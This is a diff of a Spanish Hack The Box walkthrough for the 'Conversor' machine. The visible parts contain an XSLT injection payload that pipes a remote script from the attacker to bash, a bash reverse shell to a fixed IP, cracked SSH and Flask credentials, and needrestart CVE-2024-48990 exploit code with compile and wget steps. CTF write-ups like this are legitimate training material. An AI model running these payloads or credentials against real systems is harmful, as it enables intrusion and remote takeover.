@@ -11,24 +11,12 @@ tags: ["nmap","needrestart", "xslt" ]
 ![Banner SoulMate](/img/conversorportada.png)
 ---
 
-- Box / Challenge: Conversor
-    
-- S.O: Linux 
-    
-- Dificultad: Easy 
-    
-- Plataforma: Hack The Box
-    
-- Fecha: 29-10-2025
----
-
 ### 📌 Escaneos
 ---
 
 - Comando usado:
 
    ```bash
-   
    nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>
    ```
 
@@ -40,7 +28,6 @@ tags: ["nmap","needrestart", "xslt" ]
 - Captura:
 
 ```bash
-
 PORT   STATE SERVICE REASON         VERSION
 
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
@@ -48,7 +35,6 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Did not follow redirect to http://conversor.htb/
 
 Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
 ---
@@ -112,7 +98,6 @@ Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 **install.md**
 
 ```bash
-
  File: install.md
 ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    1   │ To deploy Conversor, we can extract the compressed file:
@@ -140,7 +125,6 @@ Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
   23   │ """
   24   │ * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
   25   │ """
-
 ```
 
 ### Qué hace concretamente
@@ -192,7 +176,6 @@ app.secret_key = 'C0nv3rs0rIsthek3y29'
 **shell.xslt**
 
 ```bash
-
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet 
     xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
@@ -207,18 +190,14 @@ os.system("curl <IP-ATACANTE>:8000/shell.sh|bash")
 </shell:document>
 </xsl:template>
 </xsl:stylesheet>
-
 ```
 
 **shell.sh**
 
 ```bash
-
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.16.100/9001 0>&1
-
 ```
-
 
 - Debemos levantar un servidor en la misma ubicación que el archivo y con el puerto que indicamos en el archivo e iniciar un oyente en este caso en el puerto 9001.
 
@@ -241,9 +220,7 @@ bash -i >& /dev/tcp/10.10.16.100/9001 0>&1
 - Encontramos la credencial y probamos con hydra logrando resultados positivos
 
 ```bash
-
 [22][ssh] host: conversor.htb   login: fismathack   password: Keepmesafeandwarm
-
 ```
 ---
 ### 🔗 Credenciales
@@ -265,7 +242,6 @@ Matching Defaults entries for fismathack on conversor:
 
 User fismathack may run the following commands on conversor:
     (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
-
 ```
 
 
@@ -278,11 +254,8 @@ User fismathack may run the following commands on conversor:
 - La versión needrestart es antigua:
 
 ```bash
-
 sudo /usr/sbin/needrestart -v   
-  
 needrestart v3.7   
- 
 ```
 
 - Por lo tanto, es posible usar CVE-2024–48990 para obtener una shell, pero el objetivo no tiene gcc, por lo que necesitamos construir lib.c en nuestra máquina y compilarlo con gcc.
@@ -292,7 +265,6 @@ https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
 **Primero crea lib.c en tu maquina**
 
 ```bash
-
 cat lib.c 
 
 #include <stdio.h   
@@ -313,15 +285,12 @@ void a() {
         system(shell);   
     }   
 }   
-
 ```
 
 - Ejecutamos para compilar en nuestra maquina atacante
 
 ```bash
-
 x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c
-
 ```
 
 
@@ -330,7 +299,6 @@ x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c
 **runner.sh**
 
 ```bash
-
 #!/bin/bash  
 set -e  
 cd /tmp  
@@ -355,28 +323,21 @@ time.sleep(1)
 EOF  
   
 cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
-
-
 ```
 
   
 - Inicia un servidor
 
 ```bash
-
 python3 -m http.server  
-
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```    
 
 - Despues en la maquina victima descargamos el archivo, le damos permisos de ejecución y lo ejecutamos 
 
 ```bash
-
 wget http://10.10.14.118:8000/runner.sh  
-
 fismathack@conversor:/dev/shm$ chmod +x runner.sh  
-
 fismathack@conversor:/dev/shm$ ./runner.sh
 ```
 
